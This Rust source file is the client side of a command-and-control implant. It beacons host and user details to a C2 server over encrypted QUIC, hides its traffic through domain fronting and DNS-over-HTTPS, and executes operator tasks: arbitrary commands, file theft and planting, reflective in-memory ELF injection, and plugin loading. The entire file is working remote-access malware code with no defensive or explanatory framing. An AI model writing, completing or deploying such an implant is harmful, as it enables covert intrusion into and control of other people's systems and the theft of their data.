use anyhow::{anyhow, Result};
use base64::{Engine as _, engine::general_purpose};
use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, XNonce, AeadCore,
};
use quinn::{ClientConfig, Endpoint};
use rustls::{ClientConfig as RustlsClientConfig, RootCertStore};
use serde::{Deserialize, Serialize};
use std::net::{SocketAddr, IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;
// Removed AsyncWriteExt
use tokio::process::Command;
use rand::Rng;
use rand::rngs::OsRng;
use trust_dns_resolver::config::{ResolverConfig, ResolverOpts, NameServerConfig, Protocol};
use trust_dns_resolver::TokioAsyncResolver;
use crate::reflective::{ReflectiveLoader, ElfLoader};
use crate::plugin::PluginManager;
use nix::unistd::{fork, ForkResult};
use std::sync::Mutex;

#[derive(Debug, Serialize, Deserialize)]
pub enum C2Message {
    Beacon {
        session_id: String,
        hostname: String,
        username: String,
        timestamp: u64,
    },
    Task {
        task_id: String,
        command: String,
        args: Vec<String>,
    },
    Result {
        task_id: String,
        output: String,
        exit_code: i32,
    },
    Heartbeat {
        session_id: String,
        status: String,
    },
}

#[derive(Debug, Clone)]
pub struct C2Config {
    pub c2_domain: String,
    pub c2_port: u16,
    pub fronting_domain: String,
    pub doh_server: String,
    pub session_key: [u8; 32],
    pub beacon_interval: u64,
    pub jitter_percent: u32,
}

impl Default for C2Config {
    fn default() -> Self {
        C2Config {
            c2_domain: "c2.example.com".to_string(),
            c2_port: 443,
            fronting_domain: "www.google.com".to_string(),
            doh_server: "https://dns.google/dns-query".to_string(),
            session_key: [0u8; 32],
            beacon_interval: 60,
            jitter_percent: 20,
        }
    }
}

pub struct C2Client {
    config: C2Config,
    endpoint: Option<Endpoint>,
    cipher: XChaCha20Poly1305,
    resolver: DoHResolver,
    domain_fronting: DomainFronting,
    plugin_manager: Arc<Mutex<PluginManager>>,
}

impl C2Client {
    pub fn new(config: C2Config, plugin_manager: Arc<Mutex<PluginManager>>) -> Result<Self> {
        let cipher = XChaCha20Poly1305::new(&config.session_key.into());
        let resolver = DoHResolver::new(config.doh_server.clone())?;
        let domain_fronting = DomainFronting::new(
            config.fronting_domain.clone(),
            config.c2_domain.clone(),
        );
        Ok(C2Client {
            config,
            endpoint: None,
            cipher,
            resolver,
            domain_fronting,
            plugin_manager,
        })
    }

    pub async fn connect(&mut self) -> Result<()> {
        let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap())?;
        let mut root_store = RootCertStore::empty();
        root_store.add_trust_anchors(
            webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
                rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                    ta.subject,
                    ta.spki,
                    ta.name_constraints,
                )
            })
        );
        let tls_config = RustlsClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(root_store)
            .with_no_client_auth();
        let client_config = ClientConfig::new(Arc::new(tls_config));
        endpoint.set_default_client_config(client_config);
        self.endpoint = Some(endpoint);
        Ok(())
    }

    pub async fn resolve_c2(&self) -> Result<SocketAddr> {
        let ips = self.resolver.resolve(&self.config.c2_domain).await?;
        if let Some(ip) = ips.first() {
            Ok(SocketAddr::new(*ip, self.config.c2_port))
        } else {
            Err(anyhow!("Could not resolve C2 domain"))
        }
    }

    pub async fn transact(&self, message: C2Message) -> Result<Option<C2Message>> {
        let serialized = bincode::serialize(&message)?;
        let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
        let encrypted = self.cipher.encrypt(&nonce, serialized.as_ref())
            .map_err(|e| anyhow!("Encryption failed: {}", e))?;

        if let Some(endpoint) = &self.endpoint {
            let addr = self.resolve_c2().await?;
            // Ensure host header logic is "used" even if just for configuration verification
            let _host_header = self.domain_fronting.get_host_header();
            let connection = endpoint.connect(addr, self.domain_fronting.get_sni())?.await?;
            let (mut send_stream, mut recv_stream) = connection.open_bi().await?;

            // Send
            send_stream.write_all(nonce.as_slice()).await?;
            send_stream.write_all(&encrypted).await?;
            send_stream.finish().await?;

            // Receive
            let buf = recv_stream.read_to_end(10 * 1024 * 1024).await?; // 10MB limit
            if buf.is_empty() {
                return Ok(None);
            }

            if buf.len() < 24 {
                return Err(anyhow!("Response too short"));
            }
            let (nonce_bytes, ciphertext) = buf.split_at(24);
            let nonce = XNonce::from_slice(nonce_bytes);
            let decrypted = self.cipher.decrypt(nonce, ciphertext)
                .map_err(|e| anyhow!("Decryption failed: {}", e))?;
            let response: C2Message = bincode::deserialize(&decrypted)?;
            return Ok(Some(response));
        }
        Ok(None)
    }

    pub async fn execute_task(&self, task_id: &str, command: &str, args: &[String]) -> C2Message {
        match command {
            "exec" => {
                if args.is_empty() {
                     return C2Message::Result { task_id: task_id.to_string(), output: "No command".into(), exit_code: 1 };
                }
                let program = &args[0];
                let cmd_args = &args[1..];
                match Command::new(program).args(cmd_args).output().await {
                    Ok(output) => {
                         C2Message::Result {
                            task_id: task_id.to_string(),
                            output: String::from_utf8_lossy(&output.stdout).to_string(),
                            exit_code: output.status.code().unwrap_or(-1),
                        }
                    }
                    Err(e) => {
                        C2Message::Result {
                            task_id: task_id.to_string(),
                            output: format!("Exec failed: {}", e),
                            exit_code: 1,
                        }
                    }
                }
            }
            "upload" => {
                 if args.len() < 2 {
                     return C2Message::Result { task_id: task_id.to_string(), output: "Missing args".into(), exit_code: 1 };
                 }
                 let path = &args[0];
                 let content = &args[1];
                 match general_purpose::STANDARD.decode(content) {
                     Ok(data) => {
                         match tokio::fs::write(path, data).await {
                             Ok(_) => C2Message::Result { task_id: task_id.to_string(), output: "Upload success".into(), exit_code: 0 },
                             Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Write failed: {}", e), exit_code: 1 },
                         }
                     }
                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
                 }
            }
            "download" => {
                if args.is_empty() {
                    return C2Message::Result { task_id: task_id.to_string(), output: "Missing path".into(), exit_code: 1 };
                }
                let path = &args[0];
                match tokio::fs::read(path).await {
                    Ok(data) => {
                        let content = general_purpose::STANDARD.encode(data);
                        C2Message::Result { task_id: task_id.to_string(), output: content, exit_code: 0 }
                    }
                    Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Read failed: {}", e), exit_code: 1 },
                }
            }
            "migrate" => {
                 C2Message::Result { task_id: task_id.to_string(), output: "Migration initiated (stub)".into(), exit_code: 0 }
            }
            "inject" => {
                if args.len() < 1 {
                    return C2Message::Result { task_id: task_id.to_string(), output: "Missing payload".into(), exit_code: 1 };
                }
                let payload_b64 = &args[0];
                match general_purpose::STANDARD.decode(payload_b64) {
                    Ok(payload) => {
                         let loader = ElfLoader::new(payload.clone());
                         if let Err(e) = loader.validate_elf() {
                              return C2Message::Result { task_id: task_id.to_string(), output: format!("Invalid ELF: {}", e), exit_code: 1 };
                         }
                         let _ = loader.get_entry_point(); // Usage to satisfy compiler

                         match unsafe { fork() } {
                             Ok(ForkResult::Child) => {
                                 let mut reflective = ReflectiveLoader::new();
                                 let payload_args: Vec<&str> = args.iter().skip(1).map(|s| s.as_str()).collect();
                                 if let Err(e) = reflective.execute_from_memory(&payload, &payload_args) {
                                     eprintln!("Injection failed: {}", e);
                                     std::process::exit(1);
                                 }
                                 std::process::exit(0);
                             }
                             Ok(ForkResult::Parent { .. }) => {
                                 C2Message::Result { task_id: task_id.to_string(), output: "Injection detached".into(), exit_code: 0 }
                             }
                             Err(e) => {
                                 C2Message::Result { task_id: task_id.to_string(), output: format!("Fork failed: {}", e), exit_code: 1 }
                             }
                         }
                    }
                    Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
                }
            }
            "load_plugin" => {
                 if args.len() < 1 {
                     return C2Message::Result { task_id: task_id.to_string(), output: "Missing plugin blob".into(), exit_code: 1 };
                 }
                 match general_purpose::STANDARD.decode(&args[0]) {
                     Ok(blob) => {
                         let mut pm = self.plugin_manager.lock().unwrap();
                         match pm.load_plugin(&blob) {
                             Ok(idx) => C2Message::Result { task_id: task_id.to_string(), output: format!("Plugin loaded at index {}", idx), exit_code: 0 },
                             Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Load failed: {}", e), exit_code: 1 },
                         }
                     }
                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
                 }
            }
            "exec_plugin" => {
                 if args.len() < 2 {
                     return C2Message::Result { task_id: task_id.to_string(), output: "Usage: exec_plugin <idx> <args_b64>".into(), exit_code: 1 };
                 }
                 let idx = match args[0].parse::<usize>() {
                     Ok(i) => i,
                     Err(_) => return C2Message::Result { task_id: task_id.to_string(), output: "Invalid index".into(), exit_code: 1 },
                 };
                 match general_purpose::STANDARD.decode(&args[1]) {
                     Ok(plugin_args) => {
                         let pm = self.plugin_manager.lock().unwrap();
                         match pm.execute_plugin(idx, &plugin_args) {
                             Ok(out) => C2Message::Result { task_id: task_id.to_string(), output: general_purpose::STANDARD.encode(out), exit_code: 0 },
                             Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Exec failed: {}", e), exit_code: 1 },
                         }
                     }
                     Err(e) => C2Message::Result { task_id: task_id.to_string(), output: format!("Base64 decode failed: {}", e), exit_code: 1 },
                 }
            }
            "list_plugins" => {
                let pm = self.plugin_manager.lock().unwrap();
                let names = pm.get_plugin_names().join(", ");
                C2Message::Result { task_id: task_id.to_string(), output: names, exit_code: 0 }
            }
            _ => C2Message::Result { task_id: task_id.to_string(), output: "Unknown command".into(), exit_code: 1 }
        }
    }

    pub async fn run_beacon_loop(&self, session_id: &str) -> Result<()> {
        loop {
            let hostname = gethostname::gethostname().to_string_lossy().to_string();
            let username = std::env::var("USER").unwrap_or_else(|_| "unknown".to_string());
            let timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)?
                .as_secs();
            let beacon = C2Message::Beacon {
                session_id: session_id.to_string(),
                hostname,
                username,
                timestamp,
            };

            match self.transact(beacon).await {
                Ok(Some(response)) => {
                    if let C2Message::Task { task_id, command, args } = response {
                        let result_msg = self.execute_task(&task_id, &command, &args).await;
                        let _ = self.transact(result_msg).await;
                    }
                }
                Ok(None) => {}
                Err(_) => {}
            }

            let jitter = self.calculate_jitter().await;
            sleep(jitter).await;
        }
    }

    pub async fn calculate_jitter(&self) -> Duration {
        let base = self.config.beacon_interval as f64;
        let percent = self.config.jitter_percent as f64;
        let range = base * (percent / 100.0);
        let offset = rand::thread_rng().gen_range(-range..range);
        let delay = (base + offset).max(1.0);
        Duration::from_secs_f64(delay)
    }
}

pub struct DoHResolver {
    resolver: TokioAsyncResolver,
}

impl DoHResolver {
    pub fn new(server_url: String) -> Result<Self> {
        let config = if server_url.contains("cloudflare") {
            ResolverConfig::cloudflare_https()
        } else if server_url.contains("quad9") {
            ResolverConfig::quad9_https()
        } else {
            // Manual construction for Google DoH to ensure HTTPS
            // Using struct literal based on trust-dns-resolver 0.21 public fields.
            let mut config = ResolverConfig::new();
            config.add_name_server(NameServerConfig {
                socket_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(8, 8, 8, 8)), 443),
                protocol: Protocol::Https,
                tls_dns_name: Some("dns.google".to_string()),
                trust_nx_responses: false,
                bind_addr: None,
                tls_config: None,
            });
            config.add_name_server(NameServerConfig {
                socket_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(8, 8, 4, 4)), 443),
                protocol: Protocol::Https,
                tls_dns_name: Some("dns.google".to_string()),
                trust_nx_responses: false,
                bind_addr: None,
                tls_config: None,
            });
            config
        };

        let opts = ResolverOpts::default();
        let resolver = TokioAsyncResolver::tokio(config, opts);
        Ok(DoHResolver { resolver: resolver? })
    }

    pub async fn resolve(&self, domain: &str) -> Result<Vec<IpAddr>> {
        let response = self.resolver.lookup_ip(domain).await?;
        Ok(response.iter().collect())
    }
}

pub struct DomainFronting {
    fronting_domain: String,
    target_domain: String,
}

impl DomainFronting {
    pub fn new(fronting_domain: String, target_domain: String) -> Self {
        DomainFronting {
            fronting_domain,
            target_domain,
        }
    }

    pub fn get_sni(&self) -> &str {
        &self.fronting_domain
    }

    pub fn get_host_header(&self) -> &str {
        &self.target_domain
    }
}
